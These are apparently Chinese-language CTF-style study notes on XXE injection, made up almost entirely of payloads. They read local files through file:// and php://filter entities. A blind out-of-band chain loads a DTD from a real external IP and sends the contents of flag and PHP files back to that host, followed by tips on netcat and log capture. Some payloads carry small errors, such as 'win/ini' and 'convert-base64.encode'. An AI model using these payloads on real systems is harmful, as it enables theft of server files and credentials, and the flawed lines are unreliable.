# XXE基础

```
<?xml version = "1.0"?>  //xml头
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>  //主体
<na>&cc;</na>  //xml
```

xml中的标签是可以任意命名的





# 有回显，外部实体XXE

```
<?xml version = "1.0"?>
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>
<na>&cc;</na>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY f SYSTEM "file:///C://Windows//win/ini"> ]>
<x>&f;</x>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///C://Windows//win/ini"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```

php伪协议文件读取

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```



# 无回显，外部实体，XXE

xml payload

```html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://123.60.57.4/test.dtd">
%remote;%dtd;%xxe;
]>
```

先执行remote实体，再在该服务器中的test.dtd文件中执行dtd实体，再执行xxe实体



在服务器上/var/www/html下创建test.dtd文件

```
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
//这里的文件读取也可以换成其他伪协议，如http,file
<!ENTITY % dtd "<!ENTITY xxe SYSTEM 'http://123.60.57.4/pass=%file;'>">
```

```
<!ENTITY % file SYSTEM "https://127.0.0.1/flag.php">
<!ENTITY % dtd "<!ENTITY xxe SYSTEM 'http://123.60.57.4/pass=%file;'>">
```

<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

